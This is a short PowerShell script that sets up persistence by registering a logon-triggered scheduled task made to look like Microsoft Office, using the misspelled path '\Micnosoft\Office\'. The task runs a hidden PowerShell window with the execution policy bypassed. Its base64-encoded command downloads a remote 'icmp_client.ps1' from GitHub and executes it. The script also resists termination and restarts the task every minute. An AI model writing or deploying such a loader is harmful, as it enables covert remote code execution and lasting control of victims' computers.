if(Get-ScheduledTask -TaskName 'Office Feature Updates Helper') {
    Unregister-ScheduledTask -TaskName 'Office Feature Updates Helper' -Confirm:$false
}

Register-ScheduledTask 
-TaskName 'Office Feature Updates Helper' 
-TaskPath '\Micnosoft\Office\'  
-Action (New-ScheduledTaskAction -Execute 'powershell' -Argument '-w h -NoLogo -NonInteractive -ep bypass -enc aQB3AHIAIABoAHQAdABwAHMAOgAvAC8AcgBhAHcALgBnAGkAdABoAHUAYgB1AHMAZQByAGMAbwBuAHQAZQBuAHQALgBjAG8AbQAvAEMAbABpAGMAawBlAHMAdAAvAGEALwBtAGEAcwB0AGUAcgAvAGkAYwBtAHAAXwBjAGwAaQBlAG4AdAAuAHAAcwAxAHwAaQBlAHgA') 
-Settings (New-ScheduledTaskSettingsSet -DisallowHardTerminate -AllowStartIfOnBatteries -RunOnlyIfIdle -DontStopOnIdleEnd -IdleDuration 00:02:00 -RestartInterval 00:01:00) 
-Trigger (New-ScheduledTaskTrigger -AtLogon)
